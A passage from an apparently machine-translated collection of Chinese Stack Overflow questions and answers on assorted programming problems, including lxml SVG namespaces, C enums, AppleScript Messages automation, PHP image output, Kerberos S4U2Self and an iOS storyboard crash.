        Log.d("upd", x + " " + y);
        return true;
    } 
```

# jquery - Microsoft JScript 运行时错误：权限被拒绝

> ID：13806084
> 
> 赞同：2
> 
> 时间：2012-12-10T17:33:35.870
> 
> 标签：jquery

我正在使用**jQuery AJAX**使用 JavaScript 从 ASP.Net调用**web 服务方法。**当我在本地系统中使用 Web 服务时，它运行良好，但是当我将相同的 Web 服务上传到 IIS 服务器时，它显示名为 **'Microsoft JScript runtime error: Permission denied' 的错误**。给我一个解决方案来解决这个问题。

# python - python lxml inkscape 命名空间标签

> ID：13806088
> 
> 赞同：4
> 
> 时间：2012-12-10T17:33:56.130
> 
> 标签：python, svg, lxml, inkscape

我正在生成一个旨在包含 Inkscape 特定标签的 SVG 文件。例如，`inkscape:label`和`inkscape:groupmode`。我使用 lxml etree 作为我的解析器/生成器。我想将`label`and`groupmode`标记添加到以下实例：

```
layer = etree.SubElement(svg_instance, 'g', id="layer-id") 
```

我的问题是如何实现这一点，以便在 SVG 中获得正确的输出形式，例如：

```
<g inkscape:groupmode="layer" id="layer-id" inkscape:label="layer-label"> 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-12-10T17:59:54.357

首先，记住这`inkscape:`不是命名空间，它只是一种方便的方式来引用定义在 XML 根元素中的命名空间。命名空间是`http://www.inkscape.org/namespaces/inkscape`，并且根据您的 XML，`inkscape:groupmode`可能与`foo:groupmode`. 当然，您的`<g>`元素是 SVG 命名空间的一部分，`http://www.w3.org/2000/svg`. 要使用 LXML 生成适当的输出，您可以从以下内容开始：

```
from lxml import etree
root = etree.Element('{http://www.w3.org/2000/svg}svg')
g = etree.SubElement(root, '{http://www.w3.org/2000/svg}g', id='layer-id') 
```

这会让你：

```
<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg">
  <ns0:g id="layer-id"/>
</ns0:svg> 
```

要添加特定于 inkscape 的属性，您可以这样做：

```
g.set('{http://www.inkscape.org/namespaces/inkscape}groupmode', 'layer')
g.set('{http://www.inkscape.org/namespaces/inkscape}label', 'layer-label') 
```

这会让你：

```
<ns0:svg xmlns:ns0="http://www.w3.org/2000/svg">
  <ns0:g xmlns:ns1="http://www.inkscape.org/namespaces/inkscape" id="layer-id" ns1:groupmode="layer" ns1:label="layer-label"/>
</ns0:svg> 
```

信不信由你正是你想要的。`nsmap=`您可以通过在创建根元素时传递参数来稍微清理命名空间标签。像这样：

```
NSMAP = {
  None: 'http://www.w3.org/2000/svg',
'inkscape': 'http://www.inkscape.org/namespaces/inkscape',
}

root = etree.Element('{http://www.w3.org/2000/svg}svg', nsmap=NSMAP) 
```

有了这个，最终输出将如下所示：

```
<svg xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" xmlns="http://www.w3.org/2000/svg">
  <g id="layer-id" inkscape:label="layer-label" inkscape:groupmode="layer"/>
</svg> 
```

[LXML 文档](http://lxml.de/tutorial.html#namespaces)中的更多信息。

# iphone - Pubnub iOS：如何更改 Pubnub 委托？

> ID：13806089
> 
> 赞同：1
> 
> 时间：2012-12-10T17:33:55.727
> 
> 标签：iphone, ios, delegates, pubnub

我有2节课。第一个类允许您点击一个按钮来订阅一个频道。第一个类是这样实例化的：

```
pubnub = [[CEPubnub alloc] initWithPublishKey:@"demo" subscribeKey:@"demo" secretKey:@"demo" cipherKey:nil useSSL:NO];
[pubnub setDelegate:self]; 
```

在我的第二堂课中，一切都很好，直到我尝试从 Pubnub 开发者控制台发布消息。当我从开发人员控制台发布消息时，我得到“从 PubNub 频道 {name} 收到 1 条消息的输出。但是我正在使用的可选 Pubnub 委托方法被调用但没有打印出我的 NSLOG。

我将代表设置为我的第一堂课来解决这个问题。但我是 iPhone/objective C 的新手，可以使用一些帮助来将我的 Pubnub 对象的委托设置为第二类。

每当第一堂课时，我都尝试将委托设置为零：viewWillDisappear，然后在第二堂课中再次设置委托：viewWillAppear，但没有运气=（我做错了什么吗？

对不起，如果这令人困惑，我还在学习。:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2015-08-25T22:39:39.750

最好的方法是保持简单。创建自定义类只会使入门变得更加困难。我建议只遵循这里的简单教程（新的 SDK，因为这个问题是使用简化的 API 发布的）。

[https://www.pubnub.com/docs/ios-objective-c/pubnub-objective-c-sdk-v4](https://www.pubnub.com/docs/ios-objective-c/pubnub-objective-c-sdk-v4)

# c - 如果第一个定义为 1，枚举元素的值是多少？

> ID：13806093
> 
> 赞同：1
> 
> 时间：2012-12-10T17:34:07.523
> 
> 标签：c, enums

我有以下代码：

```
enum e {
    X=1,
    Y,
    Z
} 
```

如果第一个定义为 1，枚举元素的值是多少？

其他元素会每增加 1 吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-12-10T17:40:37.403

正如其他人所说，答案是肯定的。这是标准的说法。

**C99 规范。第 6.7.2.2 节枚举说明符。第 3 段**

> 枚举器列表中的标识符被声明为具有 int 类型的常量，并且可以出现在任何允许的地方。）带有 = 的枚举器将其枚举常量定义为常量表达式的值。如果第一个枚举数没有 =，则其枚举常数的值为 0。
> 
> 后面的每个没有 = 的枚举数都将其枚举常量定义为前一个枚举常量的值加 1 得到的常量表达式的值。（使用带 = 的枚举数可能会产生枚举常量，其值与同一枚举中的其他值重复。）
> 
> 枚举的枚举数也称为其成员。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-10T17:35:32.020

> 如果第一个定义为 1，枚举元素的值是多少？

Y = 2，Z = 3（除非另有说明）。

> 其他元素是否会每增加 1？

是的。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-10T17:35:12.167

是的，Y 为 2，Z 为 3。如果没有明确设置，枚举会增加。

# java - 搜索方法，If 语句显示多次

> ID：13806094
> 
> 赞同：-1
> 
> 时间：2012-12-10T17:34:10.577
> 
> 标签：java, if-statement, for-loop

在下面的代码中，我在 lName 数组中搜索姓氏，一旦在数组中找不到姓氏，每次在循环中找不到该姓氏时，else 输出就会显示，我将如何解决这个问题？如果我在 else 部分添加一个 return false 语句，它会在检查数组的第一个位置后停止循环。

任何帮助将不胜感激！

```
public boolean search(String StudentlName)
{ 
    boolean found = true;   // set flag to true to begin first pass

    while ( found ==true )
    {
        for (int index = 0; index<lName.length; index ++)
        {
            if (StudentlName.equalsIgnoreCase(lName[index])  )
            {
                System.out.println(course+"\n"+
                "Student ID = \t"+index+"\n"+ 
                unitTitle + "\n" +
                fName[index] + "\n"  + 
                lName[index] + "\n" + 
                Marks[index] + "\n" + "\n" );
                found = false;

                return true;//Stops The Loop once Found used to stop infinite loop
            }
            else
            {
                System.out.println("Student Not Found");
            }
        }
        return false;
    }
    return true;  
} 
```

**如果未找到结果，则显示输出**

> 找不到
> 
> 学生 找不到
> 
> 学生 找不到学生 找不到
> 
> 学生 找不到
> 
> 学生

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T17:37:32.063

在您返回 false 之前，在循环外打印“Student not found”。你只返回一次 false，然后你就知道你没有找到学生；不需要“其他”。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:42:42.063

```
public boolean search(String StudentlName)
{ 
    boolean found = true;   // set flag to true to begin first pass

    while ( found ==true )
    {
    for (int index = 0; index<lName.length; index ++)
    {
        if (StudentlName.equalsIgnoreCase(lName[index])  )
        {
            System.out.println(course+"\n"+
            "Student ID = \t"+index+"\n"+ 
            unitTitle + "\n" +
            fName[index] + "\n"  + 
            lName[index] + "\n" + 
            Marks[index] + "\n" + "\n" );
            found = false;

            return true;//Stops The Loop once Found used to stop infinite loop
        }

    }
    System.out.println("Student Not Found");
    return false;
    }
return true;  
} 
```

这对您有用，因为每次您错过要搜索的姓氏时，都会执行 else 部分。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:45:25.573

为简化起见，我相当肯定 while 循环没有任何好处。它总是会在第一次迭代时返回，所以没有必要。因此，在删除了 found 和 while 循环之后，我们就剩下了。

```
public boolean search(String StudentlName)
{ 
    for (int index = 0; index<lName.length; index ++)
    {
        if (StudentlName.equalsIgnoreCase(lName[index])  )
        {
            System.out.println(course+"\n"+
                 "Student ID = \t"+index+"\n"+ 
                 unitTitle + "\n" +
                 fName[index] + "\n"  + 
                 lName[index] + "\n" + 
                 Marks[index] + "\n" + "\n" );
            return true;//Stops The Loop once Found
        }
        //Don't do anything when they aren't equal, except test the next one
    }
    //We checked everything, found nothing, So now print the message.
    System.out.println("Student Not Found");
    return false;
} 
```

# javascript - 创建带有可选点的设计文本区域或 div

> ID：13806096
> 
> 赞同：0
> 
> 时间：2012-12-10T17:34:20.737
> 
> 标签：javascript, html, css

如何使 textarea 或 div 看起来像这样？

![在此处输入图像描述](../Images/c07b7b428d892502d26810e0e60e57f4.png)

可以通过光标检测圆圈（用于单击、移动等）。

是否有任何 jquery 插件可以让我调整 textarea 的大小并像 Pickmonkey 一样增加字体大小？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T18:00:57.760

您可以使用如下的 HTML 结构轻松地绘制它：

```
 <div id="mytextbox" style="position: absolute; width: 200px; height: 30px; border: solid 1px #fff">
        <div style="top: -20px; left: 50%;cursor: move;" class="move"  onmousedown="beginResize('top',event)">&nbsp;</div>
        <div style="position: absolute; top: -5px; left: -5px;cursor: nw-resize;" class="corner" onmousedown="beginResize('topleft',event)">&nbsp;</div>
        <div style="top: -5px; right: -5px;cursor: ne-resize;" class="corner"  onmousedown="beginResize('topright',event)">&nbsp;</div>
        <div style="bottom: -5px; left: -5px;cursor: sw-resize;" class="corner"  onmousedown="beginResize('bottomleft',event)">&nbsp;</div>
        <div style="bottom: -5px; right: -5px;cursor: se-resize;" class="corner"  onmousedown="beginResize('bottomright',event)">&nbsp;</div>
        <div style="top: 50%; left: -5px;cursor: w-resize;" class="side"  onmousedown="beginResize('left',event)">&nbsp;</div>
        <div style="top: 50%; right: -5px;cursor: e-resize;" class="side"  onmousedown="beginResize('right',event)">&nbsp;</div>
        <textarea style="border: 0px; background: transparent; width: 200px; height: 30px; padding: 0px;">Some Text</textarea>
    </div> 
```

并在您的样式表中包含这些 CSS 类：

```
.corner{
position: absolute;
background: url('cornercircle.png') top left no-repeat;
width: 10px;
height: 10px;
}
.side{
position: absolute;
background: url('sidelines.png') top left no-repeat;
width: 10px;
height: 10px;
margin-top: -5px;
}
.move{
position: absolute;
background: url('topcirclewithline.png') top left no-repeat;
width: 10px;
height: 20px;
margin-left: -5px;
} 
```

使角和边实际调整文本框的大小是一项稍大的任务，所以我将把它留给你......

更新：图像如下：

*   cornercircle.png 是一个 10px x 10px 透明的圆形 PNG，放置在角落
*   sidelines.png 是两个垂直线的 10px x 0px 透明 png，放置在两侧
*   topcirclewithline.png 是一个 10 像素 x 20 像素的透明圆的 png，带有一条从圆延伸的线，放置在盒子上方。

# macos - 有人知道如何创建一个快捷方式来将选定的文件附加到 iMessage 吗？

> ID：13806103
> 
> 赞同：0
> 
> 时间：2012-12-10T17:34:47.197
> 
> 标签：macos, command, osx-lion, imessage

我希望能够在我的桌面上选择一个项目并键入一个快捷方式，以将所选项目附加到使用消息应用程序的新消息中。我尝试在 Finder.app 下的系统偏好设置/键盘/键盘快捷键/应用程序快捷方式中创建一个，键入“共享>消息”，但它没有用。我有一个使用 automator 创建的“带有选择的新电子邮件”的快捷方式，但 Messages 不是一个选项。我还尝试为此搜索 Applescript 或终端命令，以便我可以使用 Better Touch Tool 通过滑动手势来完成。我与一位 Apple 高级顾问交谈过，他说他也不知道该怎么做，也不会在论坛上发布。

如果有人知道如何为此操作创建快捷方式，请告诉我。

更新：我从 /System/Library/PrivateFrameworks/ShareKit.Framework/Versions/A/Plugins/Message s.sharingservice/Contents/MacOS 复制了这个

如果有人知道这条线是否可以用 automator 变成 .service，请告诉我如何做/修改它。

谢谢

/System/Library/PrivateFrameworks/ShareKit.framework/Versions/A/PlugIns/Messages.sharingservice/Contents/MacOS/Messages；出口; NAME-Mac:~ NAME$ /System/Library/PrivateFrameworks/ShareKit.framework/Versions/A/PlugIns/Message s.sharingservice/Contents/MacOS/Messages ; 出口; -bash：/System/Library/PrivateFrameworks/ShareKit.framework/Versions/A/PlugIns/Message s.sharingservice/Contents/MacOS/Messages

```
-- 
```

延迟 0.218623 将 timeoutSeconds 设置为 2.000000 将 uiScript 设置为“单击应用程序进程 \"Finder\"" 的滚动区域 1 组 1 的图像 \"Test File\" 我的 doWithTimeout(uiScript, timeoutSeconds)

-- 消息延迟 0.263641 将 timeoutSeconds 设置为 2.000000 将 uiScript 设置为“单击应用程序进程 \"Finder\" 的滚动区域 1 的组 1 的菜单 1 的菜单项 \"Share\" 的菜单 1 的菜单项 \"Message\" " 我的 doWithTimeout(uiScript, timeoutSeconds)

在 doWithTimeout(uiScript, timeoutSeconds) 上将 endDate 设置为（当前日期）+ timeoutSeconds 重复尝试运行脚本“告诉应用程序\“系统事件\”“& uiScript &“结束告诉”退出重复错误errorMessage if ((当前日期) > endDate ) 然后错误“Can not” & uiScript end if end try end repeat end doWithTimeout

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-13T19:36:28.727

我看不出如何让那些运行。

您可以设置 Automator 服务，并将其输入设置为“Finder”中的文件和文件夹

并在运行 Applescript 操作中使用此代码。

它有效但主要的问题是找到正确的伙伴。我已经设置好了，所以你可以选择你想要的。可以做更多的工作我希望让您输入一个名称，它会返回较小的匹配名称和句柄列表。

```
on run {input, parameters}

    set buddieList to {}
    set splitter to "======"
    tell application "Messages"
        --set buddieList to {name of buddies, handle of buddies}
        repeat with i from 1 to number of items in buddies
            set this_item to item i of buddies
            copy (name of this_item as string) & splitter & handle of this_item as string to end of buddieList

        end repeat
    end tell

    set inputAlias to item 1 of input as alias

    set text_returned to item 1 of (choose from list buddieList with prompt "TO:" without multiple selections allowed and empty selection allowed)
    set theBuddy to (do shell script "echo  " & quoted form of text_returned & " | awk -F" & splitter & " '{print $2}'")
    tell application "Messages"
        set theBuddy to first buddy whose handle is theBuddy

        send inputAlias to theBuddy

    end tell

end run 
```

**更新。

回答您的评论：我实际上并没有使用查找器共享中的搜索字段。所以很高兴看到它的结构与我构建选择器的方式相同。:-)

但它似乎在搜索您的联系人而不是好友列表。

因此，这个新脚本使用搜索包含您输入的任何文本的联系人姓名。就像真正的份额一样。无法保证这些人的号码或电子邮件将链接到 iMessages 他们的结尾。

另请注意，我在几分钟内将其放在一起。所以它不像它可能的那样整洁。但它给了你一些玩的东西。

```
on run {input, parameters}

    set buddieList to {}
    set splitter to "======"
    tell application "Messages"
        activate
        display dialog "Name Contains.." default answer "" buttons {"Cancel", "OK"} default button 2
        copy the result as list to {text_returned, button_pressed}

    end tell
    tell application "Contacts"

        set buddies to people whose name contains text_returned

        repeat with a from 1 to number of items in buddies

            set this_name to name of item a of buddies
            set this_email to email of item a of buddies
            set this_phone to phone of item a of buddies
            repeat with e from 1 to number of items in this_email

                set this_email_item to item e of this_email
                if this_email_item is not {} then
                    copy (this_name) & splitter & value of this_email_item as string to end of buddieList
                end if
            end repeat

            repeat with e from 1 to number of items in this_phone

                set this_iphone_item to item e of this_phone
                if this_iphone_item is not {} then
                    copy (this_name) & splitter & value of this_iphone_item as string to end of buddieList
                end if
            end repeat

        end repeat
    end tell

    tell application "Messages" to set text_returned to item 1 of (choose from list buddieList with prompt "TO:" without multiple selections allowed and empty selection allowed)

    set inputAlias to item 1 of input as alias

    set theBuddy to (do shell script "echo  " & quoted form of text_returned & " | awk -F" & splitter & " '{print $2}'")
    tell application "Messages"
        try
            set findBuddy to first buddy whose handle is theBuddy

            send inputAlias to findBuddy
        on error
             display dialog "NO BUDDY Found with " & theBuddy
        end try
    end tell

end run 
```

它旨在放入 Automator 中的 Run Applescript Action 中。作为一项服务。复制并粘贴它以替换所有默认代码。

![在此处输入图像描述](../Images/71d4fa7257bed8800504f6bf24ff690a.png)

# git - 公共存储库允许其他人编辑我的代码？

> ID：13806105
> 
> 赞同：1
> 
> 时间：2012-12-10T17:34:53.053
> 
> 标签：git, bitbucket

如果我在 bitbucket 上有一个公共存储库，这是否意味着其他用户可以查看**和**编辑我的代码，或者他们可以简单地查看它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T17:39:04.070

在公共存储库中，所有用户（通常也包括非用户）都可以查看和下载您的代码。他们只有在获得明确许可的情况下才能进行编辑。

# php - 从 imagecopy 函数中得到乱码，

> ID：13806107
> 
> 赞同：0
> 
> 时间：2012-12-10T17:35:04.120
> 
> 标签：php

嗨，我刚刚编写了代码：

```
<?php
$ur = $user['Skin'];

$filename = "img/Skins/" . $ur;
list($w, $h, $type, $attr) = getimagesize($filename);
$img = imagecreatefrompng($filename); 
$src_im = imagecreatefrompng($filename);
$src_x = '30';   // begin x
$src_y = '45';   // begin y
$src_w = '40'; // width
$src_h = '35'; // height
$dst_x = '0';   // destination x
$dst_y = '0';   // destination y

$dst_im = imagecreatetruecolor($src_w, $src_h);
$white = imagecolorallocate($dst_im, 255, 255, 255);
imagefill($dst_im, 0, 0, $white);

imagecopy($dst_im, $src_im, $dst_x, $dst_y, $src_x, $src_y, $src_w, $src_h);

?>
<img src="<?php print_r(imagepng($dst_im)); ?>"/> 
```

这应该做的是获取图像“皮肤”并剪下头部，所以我的图像：

```
<img src="<?php print_r(imagepng($dst_im)); ?>"/> 
```

应该只是头部的皮肤。但是，我得到了这个胡言乱语：

> ù¬åä) BðÔ€ÛÂ~Í‹P3£Œ´¶ÛÛ A†YEUkÌ¡èæ_Ê!ÊÔgò s“Û¤ÇC,MŒ+‰?>¡·Ñ[ïªWf™.œsá¸œ3€@á¦~vþf ŒÀì¢ ª}à9¹#åIÄ‰ê•¡ èˆÀî”Ûw¥@ù"¢¢™áHªUúÝ¸÷ÉÇYÿ®šGÅçÇ˜îwqžˆ³ýÏJ ÕKSêô¯Tis“†Ã¡í©ÈK‡}G:Xqt×ÓIJEpT,úŽ¿ƒ ~¼lÞÈÚ6]_Óœ>®çqÿNÏ'çqWŠjš-…(—=g¿ÁŸÍgæ+ùB¹R©ÖwÜ¸þn¤:C‰õØËüÛïÝ±I¸°\ÉÌ[%«V³7ÞÕM¾Í>[ké·IEND®B`‚1"/ >

我应该怎么做，我该如何解决？

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:43:21.750

一种解决方案是使用您的 php 脚本作为标签的`src`属性：`<img>`

**yourScript.php**

```
...

$im = imagepng($dst_im);

header('Content-Type: image/png');

imagepng($im);
imagedestroy($im); 
```

**标记**

```
<img src="yourScript.php" alt="Some alt text"> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-07-06T15:58:45.983

@moonwave99 答案是正确的。但是，如果您想从 imagecopy 函数获取图像 base64 数据，这是我所做的一个简单示例。

我用它在图片上创建水印。

```
<?php
function image_data_base64() {
    $stamp = imagecreatefrompng('watermark.png');
    $im = imagecreatefrompng('picture.png');
    imagecopy($im, $stamp, imagesx($im) - imagesx($stamp) - 15, 15, 0, 0, imagesx($stamp), imagesy($stamp));
    ob_start();
        imagepng($im);
        $image_data = ob_get_contents();
    ob_end_clean();
    return base64_encode($image_data);
}
?>
<img src="data:image/png;base64,<?php echo image_data_base64(); ?>" /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:39:00.920

你不能只输出这样的图像。那是图像的数据。您可以写入文件并使用相应的 URI，也可以这样做

```
<img src="data:image/png;base64,<?php echo base64_encode(imagepng($dst_im)); ?>" /> 
```

# javascript - 如何匹配变量对

> ID：13806110
> 
> 赞同：3
> 
> 时间：2012-12-10T17:35:20.763
> 
> 标签：javascript, operators

我将三个网址拆分为关键字。在 JavaScript 中，我想查看其中两个 Url 是否匹配两个给定的关键字。两个关键字都必须匹配两个 url 才能继续执行代码，但我想不出一个捷径。

我试过了...

```
if (url1 || url2 || url3 === "keyword1" && "keyword2") {
....
} 
```

和

```
if (url1 || url2 || url3 === "keyword1" && url1 || url2 || url3 == "keyword2") {
    ....
    } 
```

这是我得到的。问题是，它只返回一个关键字的匹配项，而不是只返回两个关键字的匹配项。我有一种感觉，不排除第一个匹配导致第二个匹配相同的变量。我希望这是有道理的！

有谁能够帮助我？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-10T17:38:10.310

`||`并且`&&`是逻辑运算符。您不能将字符串用作其操作数（有意义地）。

您必须单独检查每个 url 匹配并对结果进行逻辑操作。此外，您应该使用`()`不要混淆运算符优先级。

尝试类似：

```
[url1, url2, url3].indexOf("keyword1") != -1 && [url1, url2, url3].indexOf("keyword2") != -1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-10T17:45:31.260

您应该能够使用该功能`indexOf()`。

```
array = [url1, url2, url3]
if(array.indexOf("keyword1") >= 0 && array.indexOf("keyword2") >= 0) {
    ....
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-10T17:39:27.127

这是我能想到的最短方法：

```
switch("keyword1") {
  case url1: case url2: case url3:
    switch("keyword2") {
      case url1: case url2: case url3:
        // success! rest of code here
    }
} 
```

如果你 polyfill Array.prototype.indexOf，你可以使用：

```
var urls = [url1,url2,url3];
if( urls.indexOf("keyword1") > -1 && urls.indexOf("keyword2") > -1) {
    // ok!
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-12-10T17:40:00.273

```
var urls     = [url1, url2, url3], 
    keywords = ["keyword1", "keyword2"],
    match1   = 0,
    match2   = 0;

for (i=urls.length; i--;) {
   if (urls[i].indexOf(keywords[0]) != -1) {
       match1 = i;
   }else if (urls[i].indexOf(keywords[1]) != -1) {
       match2 = i;
   }
}

if (match1 && match2) {
    //urls[match1] //contains url matched to keyword1
    //urls[match2] //contains url matched to keyword2
} 
```

没有`array.indexOf`？

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-12-10T17:41:02.973

如果您将所有 url 值组合到一个可以使用的数组中[`.indexOf()`](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Array/indexOf)（如果浏览器不支持这种相对较新的方法，则该页面包含兼容版本）。

```
var urls = [url1, url2, url3];

if (urls.indexOf('keyword1') >= 0 && urls.indexOf('keyword2') >= 0) {
    // both keywords are in there somewhere
} 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-10T17:40:16.193

编辑：

一个完整的解决方案：

```
var urls = ['http://google.com', 'http://yahoo.com'];
var keywords = ['oo', 'com'];

var matches = [];
var i;
for (i = 0; i < urls.length; i++) {

    var j;
    var matched = true;
    for (j = 0; j < keywords.length; j++) {
        matched = matched && urls[i].indexOf(keywords[j]) !== -1;
    }

    if (matched) {
        matches.push(urls[i]);
    }
} 
```

然后matches数组包含与给定关键字匹配的url

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-10T17:49:32.747

没有多重匹配速记，你必须写出条件，并匹配不同的组合：

```
if (
  (url1 === "keyword1" && url2 === "keyword2") ||
  (url1 === "keyword1" && url3 === "keyword2") ||
  (url2 === "keyword1" && url3 === "keyword2") ||
  (url1 === "keyword2" && url2 === "keyword1") ||
  (url1 === "keyword2" && url3 === "keyword1") ||
  (url2 === "keyword2" && url3 === "keyword1")
) {
  ...
} 
```

# python - PyDev：chaco.shell 导入

> ID：13806113
> 
> 赞同：2
> 
> 时间：2012-12-10T17:35:30.477
> 
> 标签：python, eclipse-plugin, pydev

我有两个工作区，它们的代码和 sys.path 在 Mac 上工作。一个工作正常，另一个在导入 chaco.shell 时出现问题（ImportError: No module named shell）。

我正在使用enthought分布。两个工作区都没有内置 chaco。

可能是什么问题呢？

这是代码：

```
 import sys
    from pprint import pprint as pp
    pp(sys.path)

    import numpy as np
    from chaco.shell import *

    x = np.linspace(-2*np.pi, 2*np.pi, 100)
    y = np.sin(x)

    plot(x, y, "r-")
    title("First plot")
    ytitle("sin(x)")
    show() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-21T01:53:08.470

我和你有同样的问题。使用代码：

```
import numpy as np
from chaco.shell import *

x = np.linspace(-2*np.pi, 2*np.pi, 100)
y = np.sin(x)

plot(x, y, "r-")
title("First plot")
ytitle("sin(x)")
show() 
```

和你一样的错误。我意识到我将我的 python 文件命名为 chaco.py，它创建了一个 chaco.pyc，这就是问题所在。我将文件重命名为其他名称，并且效果很好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-11T01:26:56.473

我通过删除包含相关代码的目录中的所有其他 python 文件来解决此问题。好像当 python 运行一个 py 文件时，同一目录中的其他 py 和 pyc 文件可能会干扰。

# sql - 跟踪我所有添加的朋友列表的任何方法（待处理请求）

> ID：13806116
> 
> 赞同：0
> 
> 时间：2012-12-10T17:35:38.027
> 
> 标签：sql, facebook-graph-api, facebook-fql

但是，如果我想检查我发送了多少人朋友通知？

我试过fql查询

SELECT uid_from, time, message FROMfriend_request WHERE uid_to = me()

但它显示我收到了请求的朋友列表。

之后我尝试了：

SELECT uid_from, time, message FROMfriend_request WHERE uid_from = me()

但它显示索引搜索错误。

当我搜索

从朋友请求中选择 uid_from、时间、消息 WHERE uid_from = me() AND uid_to = ""

然后它返回了我的结果。

任何人都可以在 FQL 查询中给我解决方案，或者如果有任何 graph.api 可用的话会很好。请为我提供经过测试的解决方案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:17:37.070

不，无法列出所有出站好友请求，您需要存储用户 ID 以检查已发送请求的状态，或者您可以列出所有传入请求

# active-directory - 在没有用户密码的情况下生成 AD Kerberos 票证

> ID：13806117
> 
> 赞同：2
> 
> 时间：2012-12-10T17:35:39.720
> 
> 标签：active-directory, kerberos, spnego

我正在开发一个需要代表用户生成 Kerberos 票证的 Java EE 服务器应用程序。

我正在开发的应用程序将使用备用凭据（非 Active Directory，例如生物识别）对用户进行身份验证，然后需要以某种方式生成一个 Kerberos 票证，显示用户已通过身份验证。然后，我将使用 Kerberos 票证生成一个 SPNEGO 令牌，并将该令牌插入到 HTTP 标头中，这样用户就不必在来自浏览器的后续请求中重新进行身份验证。

是否可以在没有用户原始 AD 密码的情况下代表用户生成 Kerberos 票证？（假设我可以访问 AD 服务帐户登录名和密码）。如果有可能，我将如何去做？需要什么样的配置、权限？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-11T11:03:17.303

是的，这是可能的。Microsoft 为此扩展了 Kerberos。这称为用户服务 (S4U)。您的案例称为`S4U2Self`（协议转换）。这将在 Java 8 中可用。您可以检查[票证](http://www.mail-archive.com/security-dev@openjdk.java.net/msg05393.html)并将该代码添加到 Java 认可的类路径中。您可以在[MIT Kerberos wiki](http://k5wiki.kerberos.org/wiki/Projects/Services4User)中阅读更多内容。

# ios - 苹果审查团队的 iOS 应用程序崩溃但我的设备上没有

> ID：13806122
> 
> 赞同：4
> 
> 时间：2012-12-10T17:35:57.973
> 
> 标签：ios, crash, appstore-approval

我的应用程序在我的 iDevices 上没有崩溃，但苹果审查团队说它在 ipad 6.0.1 上崩溃了。这是重新符号化日志的相关部分：

```
Last Exception Backtrace:
0   CoreFoundation                  0x327fb29e __exceptionPreprocess + 158
1   libobjc.A.dylib                 0x394dd97a objc_exception_throw + 26
2   UIKit                           0x38897d54 +[UIStoryboard storyboardWithName:bundle:] + 436
3   UIKit                           0x386da406 -[UIApplication _loadMainStoryboardFileNamed:bundle:] + 38
4   UIKit                           0x38563794 -[UIApplication _runWithURL:payload:launchOrientation:statusBarStyle:statusBarHidden:] + 524
5   UIKit                           0x3850bc34 -[UIApplication handleEvent:withNewEvent:] + 1000
6   UIKit                           0x3850b6c8 -[UIApplication sendEvent:] + 68
7   UIKit                           0x3850b116 _UIApplicationHandleEvent + 6150
8   GraphicsServices                0x35c8759e _PurpleEventCallback + 586
9   CoreFoundation                  0x327d067e __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__ + 10
10  CoreFoundation                  0x327cfee4 __CFRunLoopDoSources0 + 208
11  CoreFoundation                  0x327cecb2 __CFRunLoopRun + 642
12  CoreFoundation                  0x32741eb8 0x32739000 + 36536
13  CoreFoundation                  0x32741d44 CFRunLoopRunInMode + 100
14  UIKit                           0x38562478 -[UIApplication _run] + 664
15  UIKit                           0x3855f2f4 UIApplicationMain + 1116
16  MyApp                           0x0007362e main (main.m:16)
17  MyApp                           0x000735e4 start + 36 
```

这是否意味着故事板是问题（第 2 行）？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T23:39:39.103

要回答您的问题：

> 这是否意味着故事板是问题（第 2 行）？

这意味着最可能的问题与情节提要加载有关 - 无论是情节提要还是捆绑包 - 因为这是引发异常的地方。在不知道第 436 行的源代码`UIStoryboard`及其引发异常的内容的情况下，这可能与您从非 Apple 员工那里得到的一样具体。

要超越这一点并在本地实际重现崩溃（以便您可以努力修复它）：

*   验证包装/进行全新/全新安装（如评论中所建议）
*   在不同的设备上尝试（可能有*一些*残留物无法正确清除）
*   尝试较旧的 iOS 版本（也许他们不小心给了您错误的 iOS 版本信息？）
*   尝试在您的应用程序处于后台时模拟低内存环境（可能崩溃与您的应用程序在这种情况下在后台关闭和重新启动有关？）

如果您无法重现问题，您更有可能希望从审核团队获得更多信息，而不仅仅是堆栈跟踪：

*   您能否获得有关它们如何导致崩溃的更准确的再现步骤？
*   这是对现有应用程序的更新吗？他们可能有没有正确清理的旧版本的应用程序？

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-06-25T21:46:05.910

My guess is that at some point you changed the name of the storyboard file but did not reflect that change in Xcode under (project) > (target) > General > Deployment Info > Main Interface.

Consequently, it's still working on your device (because you still have the storyboard file with the old name installed on that device, as well as the new one), but it crashes when newly-installed on other devices, where only the storyboard file with the new name exists.

# transform - Mule 3.2 XSLT 节点：如何保留原始有效负载以及转换后的有效负载？

> ID：13806129
> 
